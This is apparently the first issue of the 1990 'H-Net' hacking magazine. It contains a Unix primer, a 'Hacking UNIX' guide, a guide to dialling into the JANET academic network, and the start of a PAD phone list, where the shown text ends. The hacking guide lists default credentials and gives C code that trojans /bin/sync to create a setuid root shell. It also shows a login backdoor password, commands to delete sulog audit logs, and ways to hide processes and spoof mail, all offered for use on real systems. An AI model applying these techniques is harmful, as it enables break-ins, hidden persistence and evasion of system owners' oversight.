@@ -1,0 +1,1556 @@
+ 
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+                N                                         N
+                E          ** H-Net Magazine **           E
+                T                                         T
+                H   Volume One, Issue 1, File #01 of 20   H
+                N                                         N
+                E             June 1st, 1990              E
+                T                                         T
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+ 
+ 
+Welcome to the first issue of the H-Net textfile hacking magazine!
+ 
+H-Net magazine is absolutely free of charge and can be freely distributed on
+the condition that all the files that constitute each magazine should remain
+together and not be altered or split.  Although H-Net is free I would like to
+receive contributions from readers to keep the magazine alive, you can do this
+by uploading files in Ascii or ARC format to Hackernet BBS in England - details
+of which are given at the top of this file and periodically throughout the
+magazine.  Alternativeley you can send any articles on disk (5 1/4 or 3 1/2 inc
+h
+disks) again in Ascii or ARC (PC or ST) format to the address at the bottom of
+this file.  Thank you.
+ 
+                         Bauderline,
+ 
+           Editor of H-Net and Sysop of Hackernet BBS.
+ 
+H-Net contributions to:- [Hackernet BBS,LEEDS,UK(0532)557739, 24hrs.]
+ 
+                                OR
+ 
+                         H-Net Magazine,
+                         PO BOX TR18,
+                         LEEDS,
+                         LS12 5TB,
+                         ENGLAND, UK.
+ 
+----------------------------------------------------------------------------
+ 
+This issue of H-Net includes the following:
+ 
+#01  Index of H-Net #1 by Bauderline.                         (03k)
+#02  Welcome message and intro to H-Net                       (03k)
+#03  An Introduction to Unix Part 1 by Minotaur               (13k)
+#04  Hacking Unix Part 1 by Weazle                            (14k)
+#05  Beginners Guide to JANET by Weazle                       (07k)
+#06  JANET Pad phone numbers by Boris                         (04k)
+#07  JANET Network Address List                               (09k)
+#08  Comshare PADS & Info by Knight_of_ni & Co.               (06k)
+#09  How to Crack those PASSWORDS!                            (06k)
+#10  Default Passwords by Nik & Bauderline                    (03k)
+#11  CCITT Specifications by Zed Haytey                       (04k)
+#12  Hacking DATASTREAM, logfile by Minotaur                  (34k)
+#13  Hacking SIGNET, logfile by Weazle                        (06k)
+#14  OPEN UNIVERSITY phone numbers by Zed Haytey              (02k)
+#15  MERCURY off-peak phone charges by Bauderline             (03k)
+#16  UNIX-Help conf. from UNAXCESS BBS (JANET)                (18k)
+#17  H-Net World News by Bauderline                           (07k)
+#18  Some Useful Addresses by Screaming Wall                  (02k)
+#19  Hackers BBS list from HACKERNET BBS                      (03k)
+#20  An Unashamed plug for the Hackernet BBS!                 (03k)
+ 
+===============================================================================
+[Hackernet BBS,LEEDS,UK(0532)557739, 24hrs. Home of H-Net Hacking magazine]
+ 
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+                N                                         N
+                E          ** H-Net Magazine **           E
+                T                                         T
+                H   Volume One, Issue 1, File #02 of 20   H
+                N                                         N
+                E       Welcome to H-Net Magazine!        E
+                T                                         T
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+ 
+Welcome to the first issue of the H-Net textfile hacking magazine!
+ 
+H-Net magazine comes to you from the Hackernet BBS in England - Telephone
+[LEEDS,UK](0532 557739), speeds available from 300 to 2400 baud.
+ 
+Who is H-Net intended for?
+ 
+Hackers and Phreakers from all over the world - from beginners to out and out
+experts.
+ 
+What sort of articles will H-Net have?
+ 
+Anything and everything to do with hacking and phreaking.  Obviously this
+magazine will only survive by getting contributions from it's readers - so in
+effect the subjects discussed in H-Net will depend to a large extent on the
+content of the contributions received.  Especially welcome are Hackers Guides
+to different types of systems which have not been previously covered and also
+log files of hacks or articles of hacking news from around the world (arrests
+etc.etc.).
+ 
+H-Net magazine is absolutely free of charge and can be freely distributed on
+the condition that all the files that constitute each magazine should remain
+together and not be altered or split.  Although H-Net is free I would like to
+receive contributions from readers to keep the magazine alive, you can do this
+by uploading files in Ascii or ARC format to Hackernet BBS in England - details
+ 
+of which are given at the top of this file and periodically throughout the
+magazine.  Alternativeley you can send any articles/files on disk (5 1/4 or 3
+1/2 inch disks) again in Ascii or ARC format to the address at the bottom of
+this file.
+ 
+H-Net Hackers Scruples :-
+ 
+Dont destroy or alter files or data.
+Dont 'dump' a system - anybody can do that, but it's usually a loser that does!
+ 
+ 
+I hope that you enjoy H-Net and that we can produce further issues together!!
+ 
+                         Bauderline,
+ 
+           Editor of H-Net and Sysop of Hackernet BBS.
+ 
+H-Net contributions to:- [Hackernet BBS,LEEDS,UK(0532)557739, 24hrs.]
+ 
+                                OR
+ 
+                         H-Net Magazine,
+                         PO BOX TR18,
+                         LEEDS,
+                         LS12 5TB,
+                         ENGLAND, UK.
+ 
+===============================================================================
+[Hackernet BBS,LEEDS,UK(0532)557739, 24hrs. Home of H-Net Hacking magazine]
+ 
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+                N                                         N
+                E          ** H-Net Magazine **           E
+                T                                         T
+                H   Volume One, Issue 1, File #03 of 20   H
+                N                                         N
+                E  An Introduction to UNIX, by MINOTAUR.  E
+                T                                         T
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+ 
+ 
+UNIX is widely-touted as 'the operating sustem of the future', though in fact
+it dates from 1969 (it was developed originally by Bell Laboratories, which
+runs most of the telephone systems in the USA).  Since then it's been under
+continuous development; so it's not so much an old operating system as a fairly
+ 
+mature one, if you see what I mean. Hackernet BBS has many unix files for you.
+ 
+Unix gets brownie points straight off because it was conceived by a user of
+computers rather than a software specialist or some other sort of software
+designer.  So it is relatively easy to use; which nearly all other software the
+ 
+prime goal often seems to be to make money, or to sell more hardware and
+software, or whatever.
+ 
+In brief, UNIX is a general-purpose, multi-user operarting system with a clever
+ 
+method of holding files.  It's a complex system, which means both that it is
+rich in facilities and difficult to get to grip with - until now!.....
+ 
+BEGINNER'S GUIDE TO THE WONDERFUL WORLD OF UNIX
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 
+The aim of this first textfile is to give an insight into the fundamentals of
+UNIX.  Subsequent textfiles will delve into all areas of UNIX in greater depth.
+ 
+ 
+WHAT IS UNIX?
+~~~~~~~~~~~~~
+ 
+The UNIX operating system can be divided into a number of distinct parts. First
+ 
+there is the part of the system which performs all of the interface to the
+hardware, scheduling disks, managing memory, handling terminal I/O and
+generallu handling any requests to and from the devices on the system.  This
+part of UNIX is called the UNIX Kernel.  It is in fact one large, compiled 'C'
+program which is kept on the hard disk and loaded into memory when the system
+is booted up.  The UNIX Kernel is always kept in memory because practically
+everything that is done on UNIX uses the Kernel.  Buts on its own, it is of
+little use.  There is no point in just having an interface to the hardware - an
+ 
+itnerface to the user is also required.  This is provided by the UNIX shell.
+ 
+The shell is another name for a TIP (Terminal Interface Program) or a JCL (Job
+Control Language).  Its job is to read input from the terminal and execute the
+right programs, depending on the input.  A program which is executing in UNIX
+is called a process.  In fact, the shell is also a 'C' program which is
+executing for each terminal which is logged on.  It reads input from the
+terminal, interprets the input in various ways and starts the appropriate
+processes.
+ 
+As well as interpreting input and executing processes, the shell has its own
+control-flow constructs and it can therefore be used as a programming language.
+ 
+It also handles pipes and redirection of I/O which will be the subject of a
+later textfile.
+ 
+The way the UNIX shell works is much the same as other operating systems. It
+displays a prompt, normally '$' the user types in the command to execute and
+the shell reads the command, searches for the program which is the same name as
+ 
+the command typed in and it then executes this file, if it found it.  When the
+program finishes executing, the shell redisplays the prompt to the terminal.
+ 
+OK, so we have a Kernel to handle the devices and a Shell to interpret input
+form the users terminal.  The final and by far the largest part of UNIX is the
+Programs.  There are many Programs in UNIX which form a part of the operating
+system.  In UNIX jargon, these are called Utilities.
+ 
+There are Utilities to look at directories, edit files, semd files to the line
+printer, perform backups, look at files, delete files, the list is endless.
+These Utilities are, to the user, commands which are typed in at the terminal
+prompt.  For example; 'ls' is the UNIX Utility to list the directory; 'cd' is
+the Utility to change directory.  In some systems the Utilities form a part of
+the terminal interface program which interacts with the user.  In UNIX, very
+few Utilities are a part of the Shell, the majority of them are external to the
+ 
+Shell and are called up whenever they are needed.
+ 
+This is because there are 200-300 UNIX Utilities, and including all of them in
+the shell would obviously increase the size of the Shell to an unreasonable
+level.  It is much neater to keep them on the disk to be called as and when
+they are needed.
+ 
+On a typical UNIX system, as well as the operating system, there would also be
+some other packages, word processing, spreadsheets, etc.  These are necessary
+because UNIX does not include any of these - UNIX is only an  Operating System.
+ 
+ 
+ 
+THE UNIX FILE STRUCTURE
+~~~~~~~~~~~~~~~~~~~~~~~
+ 
+The above description of UNIX is very conceptual.  You never actually se the
+UNIX Kernel, excpept perhaps as a process on the system.  The Shell too, is
+just always there when you login.  The file structure, however, has to be
+manipulated and managed by the user all the time.  The UNIX file structure is
+hierarchical.
+ 
+Within the file structure there are files and there are directories - as shown
+in the diagram below :-
+ 
+                              /(root)
+ 
+                                 |
+        _________________________________________________
+        |       |       |       |       |       |       |
+        bin     dev     etc     lib     tmp     unix    usr
+        |       |       |       |       |       |       |
+      -----   -----   -----   -----   -----   -----   -----
+      | | |   | | |   | | |   | | |   | | |   | | |   | | |
+                                                     --- ---
+                                                     ||| |||
+ 
+Files contain data and directories contain either files and/or directories. At
+the top of the hierarchy is the ROOT directory, this is sometimes referred to
+as /(slash).  Below the root directory are the system files and directories.
+ 
+When a user logs into the system, he logs into his HOME directory. Every user
+of the system has a HOME directory where he can create and delete files and
+directories.  This part of the system belongs to him. User directories are
+usually kept in the directory 'usr' which is directly below the root directory.
+ 
+For example, say the user Fred has the directory structure as shown below :-
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+                       /(root)
+                          |
+                         usr
+                          |
+                        fred
+                          |
+          ----------------------------------
+          |       |       |        |       |
+        cprogs  memos   wpfles  sprdsht pending
+          |       |       |        |       |
+        -----   -----   -----    -----   -----
+        | | |   | | |   | | |    | | |   | | |
+                               1990
+ 
+When Fred logs on he will automatically go to the directory 'fred'.  If
+however, Fred wants to examine his spreadsheets, he may want to go to the
+spreadsheet directory.  He would do this by using the 'cd' command to change
+directory, i.e:
+ 
+$cd sprdsht
+ 
+This command would make his CURRENT DIRECTORY the spreadsheets directory but
+his HOME directory wouls remain the same.  If he wanted to move to his 1988
+directory from his home directory the command would be :
+ 
+$cd sprdsht/1990
+ 
+The '/' between the two directory names is the delimiter.
+ 
+The construct 'sprdsht/1990' is called a Pathname.  Infact this particular type
+ 
+of Pathname is called a Relative Pathname because it is relative to the
+directory the user is currently in.  That is, the path 'sprdsht/1990' would be
+meaningless if the users current directory was 'wpfls'.
+ 
+Another type of pathname is an Absolute Pathname.  This, as the name suggests,
+is a path from the root directory and is therefore independent of the user's
+current directory.  Absolute pathnames are represented by using a '/' as the
+first character of a path.  For example, the Absolute Pathname of the directory
+ 
+mentioned would be '/usr/fred/sprdsht/1990'.
+ 
+The command :-
+ 
+$cd /usr/fred/sprdsht/1990
+ 
+would take Fred right to the directory regardless of his current directory. the
+ 
+command to find the Absolute Directory is :-
+ 
+$pwd
+ 
+The stands for 'print working directory'.  As mentioned above, the command to
+look at the contents of a directory is 'ls'.  By simply typing :-
+ 
+$ls
+ 
+a list of filenames is output.  This looks like :-
+ 
+cprogs
+memos
+wpfls
+sprdsht
+pending
+ 
+This is fine if just the names is required but, it is impossible to tell from
+this information which are files and which are directories.  As with a lot of
+UNIX commands, the 'ls' command performs a mimimum function.
+ 
+UNIX commands, generally speaking, have a number of options which can be used
+with them, depending on exactly what the user wants.  For example the 'ls'
+command just lists directories, if you want extra information, you have to ask
+for it. UNIX must have either been written by a mimimalist or someone who
+didn't like typing!!!  It does no more and no less than it is asked to, this is
+ 
+something that users find quite difficult to understand.
+ 
+The 'ls' command is the perfect example of this.  In most other systems it
+would be called 'dir' or 'list'.  The most commonly used option with 'ls' is
+'ls -l'.  In this case the 'l' stands for 'long'.  The command therefore
+produces a long listing of the current directory.  The output looks soemthing
+like that shown below :-
+ 
+drwxr_xr_x 4 Fred  96 Jun  1 10:00 cprogs
+drwxr_xr_x 4 Fred 195 Jul 25 09:34 memos
+drwxr-xr_x 2 Fred 167 Aug 14 17:29 wpfls
+drwxr_xr_x 2 Fred  84 May  7 07:56 sprdsht
+drwxr_xr_x 2 Fred 952 Jun 16 13:51 pending
+ 
+This will tell you whether the entry is a file or a directory. The permissions
+(r is for read, w is for write, x is for execute), the number of links to the
+file, the owner, the size (in bytes), the date it was last modified, and the
+name of the entry.  Options for the commands are sometimes (not always)
+preceeded with a minus sign and they usually consist of a letter which usually
+stands for something.  The reason for this vagueness in the format of UNIX is
+that UNIX has evolved through time and commands have been written by a variety
+of people from a variety of places so there are no hard and fast rules - this
+is another thing that newcomers to UNIX find frustrating.  It would be true to
+say that for each one of the 'rules' mentioned above, there are exceptions.
+There are also special commands for adding and removing directories from the
+directory structure.  They are 'rmdir' for removing directories and 'mkdir' for
+ 
+making directories.  They both expect a Pathname as a parameter which is the
+name of the directory to be created or removed. For example, to create the
+directory 'letters' below the directory 'wpfls' from Fred's HOME directory :-
+ 
+$mkdir wpfls/letters
+ 
+To remove this directory :-
+ 
+$rmdir wpfls/letters
+ 
+The command 'rmdir' will only remove empty directories, that is directories
+which do not contain files or sub-directories.
+ 
+Every directory in UNIX has two hidden entries, these are '.'(dot) and '..'
+(dot-dot).  These are created when the directory is created.  '.' references
+the current directory and '..' references the directory above the current
+directory (called the Parent directory).  These two directories are in fact the
+ 
+key to the way the whole file system is put together.  They can be seen by
+using the '-a' option in the 'ls' command (i.e. 'ls -al') and they can also be
+used in relative pathnames.  For example :-
+ 
+$cd ../wpfls
+ 
+from the directory 'sprdsht' in Fred's HOME directory is a perfectly acceptable
+ 
+command.
+ 
+With these commands many generations of UNIX users have had their first
+foot-hold on UNIX.  If you have any UNIX problems or comments to make then
+please leave me (MINOTAUR) a message on the Hackernet BBS.
+ 
+                              Minotaur.
+ 
+===============================================================================
+ 
+[Hackernet BBS,LEEDS,UK(0532)557739, 24hrs. Home of H-Net Hacking magazine]
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+                N                                         N
+                E          ** H-Net Magazine **           E
+                T                                         T
+                H   Volume One, Issue 1, File #04 of 20   H
+                N                                         N
+                E     Hacking UNIX, part 1, by WEAZLE.    E
+                T                                         T
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+ 
+ 
+UNIX HACKING - PART 1.
+----------------------
+ 
+You've got the 'login:' prompt - what now?
+ 
+try the following id's and passwords:-
+ 
+                ID              Password
+                --------        --------
+                root            root
+                sysman          sysman
+                admin           admin
+                sysadmin        sysadmin (or admin)
+                unix            unix
+                uucp            uucp (or comms)
+                rje             rje
+                guest           guest
+                demo            demo
+                daemon          daemon
+                sysbin          sysbin (or bin)
+                bin             bin
+                games           games (or player sometimes)
+ 
+Some of these id's might not even need a password - in that case you will go
+striaght through to the '$' prompt when you have entered the ID!!
+ 
+Some of you might be thinking that the above accounts would be the most likely
+ones for any hackers to try and therefore the system manager of a UNIX system
+would put a password on such accounts or at least change passwords to something
+ 
+a little less obvious - well I would think that too - but it is suprising what
+percentage of systems you can get into by trying out the above accounts.  I
+don't know why the System Managers havent done anything about these accounts,
+it is probably the old British attitude of 'it will never happen to our system'
+ 
+- it can and probably will!  And dont think that it is only the small companies
+ 
+that dont do very much about the security of there UNIX systems - I logged onto
+ 
+a BT Unix computer (on a freephone/toll-free number I might add) with no id's
+or passwords so I just started using some of the ones listed above - none of
+the ones that I used worked - I was just about to give up when I thought that I
+ 
+would try one last ID and Password before disconnecting and throwing the number
+ 
+away. I didnt think for one moment that the ID that I was going to try would
+work, after all it was one of British Telecoms UNIX machines - and of course
+they would be really strict about security and things like that, but I will go
+ahead and try it anyway... :-
+ 
+login:sysman
+password:sysman
+ 
+$
+ 
+I nearly fell off my chair when I got through on this account and to the '$'
+UNIX prompt, how could British Telecoms computer security be so lax? Who cares,
+ 
+ I was in! - and there was no password on the SU command!!! There is a list of
+default passwords in this issue and continuous updates on Hackernet BBS.
+ 
+ 
+If none of these accounts let you in then try obvious things like first names
+(paul,john,steve,etc.), try using the id 'who' which on some systems will at
+the 'login:' prompt tell you who else is on (useful clues for hackers!) or see
+ if there are any clues on the logon screen eg "Welcome to British Telecoms
+RACE computer" you would try things like race,race or btr/engineer, est. ok?
+ 
+When you have logged onto a UNIX system, you should always do the following:
+ 
+$ who -u
+$ ps -ef
+$ ps -u root
+ 
+This prints out who is on, who is active, what is going on and what they are
+ doing at the moment, everything in the background, and so on.
+ 
+If you are calling the UNIX system for the first time you should enter the
+following :-
+ 
+$ grep :: /etc/passwd
+ 
+This command will output to your screen parts of the 'passwd' userlist.  The
+ones that we are interested in are the ones like this :-
+ 
+paul::3323:2343:race user:/usr/paul
+ 
+i.e. the ones with '::' after the username (paul in this case).  What this
+means is that the user paul does not need a password to log on - funnily enough
+ 
+ it is usually such accounts that have the highest level of access!
+ 
+Also do this:
+ 
+$ find / -name "*log*" -print
+ 
+This lists out all the files with the name 'log' in it. If you do find a
+process that is logging what you do, or an odd log file, change it as soon as
+ you can. If you think someone may be looking at you and you don't want to
+leave (Useful for school/college or university computers) then go into
+something that allows shell breaks (VI for example), or use redirection to your
+ 
+ advantage:
+ 
+$ cat < /etc/passwd
+ 
+That puts 'cat' on the ps, not 'cat /etc/passwd'. If you're running a setuid
+ process, and don't want it to show up on a ps (Not a very nice thing to have
+happen), then:
+ 
+$ super_shell
+# exec sh
+(Runs the setuid shell (super_shell) and puts something 'over' it. You may also
+ 
+want to run 'sh' again if you are nervous, because if you break out of an
+exec'ed process, you die. Neat, huh?
+ 
+Improving your id:
+ 
+Firstly, you should issue the command
+ 
+$id
+ 
+The system will then tell you your uid and euid. This is useful for checking on
+ 
+setuid programs to see if you have root euid privs.
+ 
+Also, do this:
+$ find / -perm -4000 -exec /bin/ls -lad {} ";"
+ 
+Yes, this finds and does an extended list of all the files that have the setuid
+ 
+bit on them, like /bin/login, /bin/passwd, and so on.
+ 
+If any of them look nonstandard, play with them, you never can tell what a ^|
+will do to them sometimes.  Also, if any are writeable and executable, copy sh
+over them, and you'll have a setuid root shell. Just be sure to copy whatever
+was there back, or else your stay might not last very much longer.
+ 
+What, you have the 'bin' passwd? Well, game over. You have control of the
+system. Everything in the bin directory is owned by bin (with the exception of
+ 
+a few things), so you can modify them at will. Since cron executes a few
+programs as root every once in a while, such as /bin/sync, try this:-
+ 
+       main()
+          {
+          if (getuid()==0 || getuid()==0)
+          {
+          system("cp /bin/sh /tmp/sroot");
+          system("chmod 4777 /tmp/sroot");
+          }
+          sync();
+          }
+ 
+..continued from previous page...
+ 
+$ cc file.c
+$ cp /bin/sync /tmp/sync.old
+$ mv a.out /bin/sync
+$ rm file.c
+ 
+Now, as soon as cron runs /bin/sync, you'll have a setuid shell in /tmp/sroot.
+Feel free to hide it. The 'at' & 'cron' commands l ook at the 'at' dir.
+Usually /usr/spool/cron/atjobs. If you can  run 'at' (check by typing 'at'),
+and 'lasttimedone' is writable, then submit a blank 'at' job, edit
+'lastimedone' to do what you want it to do, and move lasttimedone over your
+entry (like 88.00.00.00). Then the commands you put in lasttimedone will be
+ran as that file's owner. Cron: in /usr/spool/cron/cronjobs, there are a list
+of  people running cron jobs.  Cat rot's, and see if he runs any of the
+programs owned by you (Without doing a su xxx -c "xxx"). For that matter, check
+ 
+all the crons. If you can take one system login, you should be able to get
+the rest, in time.
+ 
+The disk files.
+ 
+These are rather odd. If you have read permission on the disks in the '/dev'
+directory then you can read any file on the system.
+ 
+All you have to do is find it in there somewhere. If the disk is writeable,
+if you use /etc/fsbd, you can modify any file on the system into whatever
+you want, such as  by changing the permissions on '/bin/sh' to 4555. Since this
+ 
+is pretty difficult to understand I won't bother with it any more.
+ 
+Trivial su.
+ 
+You know with su you can log into anyone elses account if you know their
+passwords or if you're root. There are still a number of system 5's that have
+uid 0, null passwd, rsh accounts on them. Just be sure to remove your entry in
+the '/usr/adm/' directory - the log file is called 'sulog' and can be removed
+ with the following command if you havent mastered the UNIX editor 'VI' yet :-
+ 
+$ rm /usr/adm/sulog
+ 
+or sometimes:-
+ 
+$ rm /usr/admin/sulog
+ 
+ 
+ 
+but one command that I always use on any new system conquest is :-
+ 
+$ find / -name "sulog" -print
+ 
+This will find all the files called 'sulog' - as some system managers have been
+ 
+known to have two sulogs running at the same time, if you delete or edit the
+one in the usual directory and then they would have a backup copy in another
+directory as well.
+ 
+Trojan horses?  On unix?
+ 
+Yes, but because of the shell variable PATH, we are generally out of luck,
+because it usually searches the '/bin' and '/usr/bin' directories first.
+ 
+However, if the first field is a colon, files in the present  directory are
+searched first. Which means if you put a modfied version of 'ls' there..... If
+this isn't the case, you will have to try something more blatant, like putting
+it in a game. If you have a system login, you may be able to get something
+done like that. See cron.
+ 
+Taking over
+ 
+Once you have root privs, you should read all the mail in the '/usr/mail'
+directory just to be sure that nothing interesting is in there, or anyone is
+passing another systems passwd about even! You may want to add another entry to
+ 
+the passwd file, but that's relatively dangerous to the life of your machine.
+Be sure not to have anything out of the ordinary as the entry (i.e., No uid 0).
+ 
+ 
+Get a copy of the login program (if at all possible) of that same version of
+unix, and modify it a bit. On system 5, here's a modification pretty common in
+the routine to check correct passwds, on the line before the actual pw check
+put a
+ 
+if (!(strcmp(pswd,"h-net"))) return(1);
+ 
+to check for your 'backdoor' password "h-net", enabling you to log on as any
+valid user that isn't uid 0 (On system 5).
+ 
+Other UNIX tricks
+ 
+Have you ever been on a system that you couldn't get 'root' status or read the
+Systems/L.sys file?  Well, this is a cheap way to overcome it:-
+ 
+$ uuname
+ 
+will list all machines reachable by your unix, then, assuming that they aren't
+direct, and that the modem is available:-
+ 
+$ cu -d host.you.want
+ 
+[or]
+ 
+$ uucico -x99 -r1 -shost.you.want
+ 
+Both will do about the same for us.  This will fill your screen with lots of
+trivial information, but will eventually get to the stage of printing the
+telephone number to the other system.
+ 
+'-d' enables the cu diagnostics, '-x99' enables the uucico highest debug, and
+'-R1' says 'uucp master'. A year or two ago, almost every system had their uucp
+ 
+password set to the same thing as their nuucp passwd (Thanks to the Systems
+file), so it was a breeze getting in. Even nowadays, some places do it.. you
+never can tell.
+ 
+ 
+ 
+Uucp
+ 
+Uucico and uux are limited by the Permissions file, and in most cases, that
+means means you can't do anything except get & take from the uucppublic
+directories. Then again, if the permission/L.cmd is blank, you should be able
+to take what files you want.
+ 
+Sending mail
+ 
+Sometimes, the mail program checks only the shell variable LOGNAME, so change
+it, export it, and you may be able to send mail as anyone. Mainly early system
+five's will let you do it thus :-
+ 
+$ LOGNAME="root";export LOGNAME
+ 
+Printing out all the files on the system
+ 
+Useful if you're interested in the filenames:-
+ 
+$ find / -print >file_list&
+ 
+And then do a 'grep text file_list' to find any files with 'text' in their
+names. Like grep [.]c file_list, grep host file_list....
+ 
+Printing out all restricted files
+ 
+Useful when you have root privileges. As a normal user, do :-
+ 
+$ find / -print >/dev/null&
+ 
+This prints out all non-accessable directories, so become root and see what
+they want to hide from you!
+ 
+UNIX Humour
+ 
+On a system 5, do this :-
+ 
+$ cat "food in cans"
+ 
+or :-
+ 
+$ banner "H-Net Lives!"
+ 
+Hehehe......
+ 
+Password hacking -Salt
+ 
+In a standard /etc/passwd file, passwords are 13 characters long. This is a 11
+char encrypted passwd and a 2 char encryption modifier (salt), which is used to
+ 
+change the DES (data encryption standard) algorithm in one of 4096 ways. Which
+means that there is no decent way to go and reverse hack it. Yet. On normal
+system 5 UNIX systems passwords are supposed to be 6-8 characters long and have
+ 
+both numeric and alphabetic characters in them. Which makes a dictionary hacker
+ 
+pretty worthless. However if a user keeps insisting that his password is going
+to be 'h-net' usually the system will comply (Depending on version). I have yet
+to try it, but having the hacker try the normal entry, and then the entry
+terminated by [0-9] is said to have remarkable results, if you don't mind the
+10-fold increase in time.
+ 
+        Written by the Weazle, (Hackers Hideout on Hackernet BBS)
+ 
+===============================================================================
+ 
+[Hackernet BBS,LEEDS,UK(0532)557739, 24hrs. Home of H-Net Hacking magazine]
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+                N                                         N
+                E          ** H-Net Magazine **           E
+                T                                         T
+                H   Volume One, Issue 1, File #05 of 20   H
+                N                                         N
+                E   Beginners Guide to JANET by Weazle.   E
+                T                                         T
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+ 
+JANET (the Joint Academic NETwork) is a favourite hacking tool for newcomers to
+ 
+hacking - mainly because it and the computers attached to it offer you so much
+help and information which can be used to do nice things with their micros!
+ 
+Hey ho and here we go!
+ 
+The first thing that you need to do is to find a telephone access number for
+the JANET pad nearest to you.  To help you do this please refer to file #6, in
+this issue of H-Net which is Hackernet BBS's latest list of such numbers and in
+ 
+some cases gives the baud rates which have been tested out on these pads.
+ 
+When you have found the telephone number that you need then set your comms
+terminal to seven bits, even parity with one stop bit (7e1).  Then dial the
+telephone number (a baudrate of 2400 is sometimes catered for - but is
+unreliable on some pads).  When you get the CONNECT message press your <RETURN>
+ 
+key a couple of times, if nothing happens then wait about 4 seconds then press
+the <RETURN> key two or three times again.  You should now get a 'welcome'
+message (on some PADS you might now get the prompt 'Which Service?' type 'PAD'
+<RETURN>) the ypu will get a system prompt (e.g. 'PAD>'). If you do not get
+such a prompt then drop the line and reconfigure your comms s/w (you might have
+ 
+to do this a few times until you work out the proper settings as all pads do
+not work on a uniform setting - unfortunately! - but it's all good hacking
+experience anyway - trying to work out the proper settings for the target
+system.
+ 
+When you have the 'PAD>' or a similar prompt then type the following command:-
+ 
+PAD> logon f,r
+ 
+the pad isn't really all that fussy about what you use after the 'logon'
+command, 'f,r' is just an example - in practise you could use anything, most
+people use 'x,x' for some reasonh...please note that on some pads that you
+might have to type 'login' instead of 'logon'.
+ 
+What does this command do?  Well it tells the JANET Pad that when you have
+called through to one of the computers connected to it's network - done your
+business then exited from that computer that you want to return to the 'PAD>'
+prompt so that you can 'CALL' other computers on the network.  If you do not
+enter this command your line will be dropped when you have exited from the
+first computer on the network that you have called - and that would mean having
+ 
+to redial the pad again....yawn!
+ 
+The next command to get to grips with is the 'CALL' command.  This along with a
+ 
+NETWORK ADDRESS allows you to connect to other computers on the JANET network.
+In file #7 in this issue of H-Net you will find a list of some of the computers
+ 
+that you can connect to on the JANET network along with their NETWORK address
+and/or their NETWORK mnemonic.
+ 
+The way to use the 'CALL' command is as follows :- firstly, find the NETWORK
+ADDRESS of the computer that you wish to connect to (in this example the
+Unaxcess chatboard at Bradford University which is 0000121100 ), then type the
+following at the 'PAD>' prompt :-
+ 
+PAD> call j.0000121100
+ 
+ 
+The 'j.' just tells the pad to expect a JANET address.  Please note that some
+PAD managers have gotten wise to hackers using their PADs to gain access to
+systems on the JANET network, in these cases they might have changed the format
+ 
+of the 'CALL' command around a little bit - usually by making it so that the
+'.' after the 'j' in the above example is no longer required - on such systems
+the 'CALL' command should be :-
+ 
+PAD> call j0000121100
+ 
+On some PADs there is on online help facility - to make use of this just type:-
+ 
+ 
+PAD> help
+ 
+you should get a response similar to this :-
+ 
+Help knows about :-
+ 
+ADDRESS TARIFFS STATUS
+ 
+The address helpfile is usually quite useful - to get this type :-
+ 
+PAD> help address
+ 
+then a nice list of network mnemonics available from that PAD might start
+scrolling down your screen.  Mnemonics can be used instead of the NETWORK
+ADDRESSES previously mentioned.  For instance if we wanted to call the
+Lancaster Universities' PD software computer system use the following call
+command :-
+ 
+PAD> call lancs.pdsoft
+ 
+It is just a nice way to be able to access the systems on the network as they
+cannot expect the average student or lecturer to remember the 10 or 14 digit
+NETWORK ADDRESSES which prevail on the JANET system!
+ 
+When you have entered your 'CALL' command you should get a response such as
+'connecting..' if you just get garbage then you might need to change the
+configuration of your terminal.  For instance if you call the pad using 7e1
+then when you call an address and just get garbage then quickly switch to 8n1
+and press return once - you should then get some sense out of the computer that
+ 
+you have requested access to (usually a 'login:' or similar prompt). If this
+does not work then keep on changing your settings until you do get in.
+ 
+ 
+From here on in it will be just like calling the target computer direct, except
+ 
+that when you exit from the computer you will be returned to the 'PAD>' prompt
+again (if you remembered to enter your 'logon' command!), again - if you just
+get garbage after terminating your session on a computer on the JANET network
+then you will need to reset the configuration of your comms s/w / terminal to
+what it originally was when you first called the PAD.
+ 
+Well, that just about sums it up I guess - this should be all you need to know
+about using the JANET system and pads - the little quirks it has and so on. The
+ 
+best thing about JANET in my eyes is that (usually for the price of a local
+call) you can get into computers all over the world, belonging to mainly
+educational establishments but also defence and other organisations!  The main
+type of computers that you will find on JANET are VAX, UNIX and PRIME with a
+splattering of other systems here and there.
+ 
+I hope that this file has been of help to you - if you have any new information
+ 
+about JANET in general or some of the systems available through it then please
+e-mail me 'WEAZLE' on the Hackernet BBS.
+ 
+WEAZLE.
+ 
+===============================================================================
+ 
+[Hackernet BBS,LEEDS,UK(0532)557739, 24hrs. Home of H-Net Hacking magazine]
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+                N                                         N
+                E          ** H-Net Magazine **           E
+                T                                         T
+                H    Volume One, Issue 1, File #6 of 20   H
+                N                                         N
+                E    JANET PAD PHONE NUMBERS by Boris.    E
+                T                                         T
+                H-NET H-NET H-NET H-NET H-NET H-NET H-NET H
+ 
+                               JPAD12.TXT
+                               ----------
+ 
+JANET PAD listing - revision 1.2 - 1st March 1990
+ 
+To start you off, two excellent public-access systems exist on JANET that are
+CRAMMED with info and useful clues for would-be hackers!
+ 
+These are:
+ 
+JANET News Machine: 000050005002 (login as 'NEWS' - no password needed)
+ 
+NISS Bulletin Board:000062200000
+ 
+These two systems will give you plenty of starting points for possible hacks
+(net addresses etc). But make sure that you're on a local call if possible
+-before I found these PAD numbers, I spent 3 hours on a long-distance call to
+the Janet News Machine!!! Hope this info is of use and interest - leave a msg
+for 'Boris' on Hackernet BBS if you have questions/comments/suggestions/good
+passwords!! One more thing - try calling 000002010001 - this is a PD software
+archive run by Lancaster Uni. - they carry s/w for PC, ST, Amiga, BBC and (I
+think) other machines as well. Eventually I'll put up a file on here going
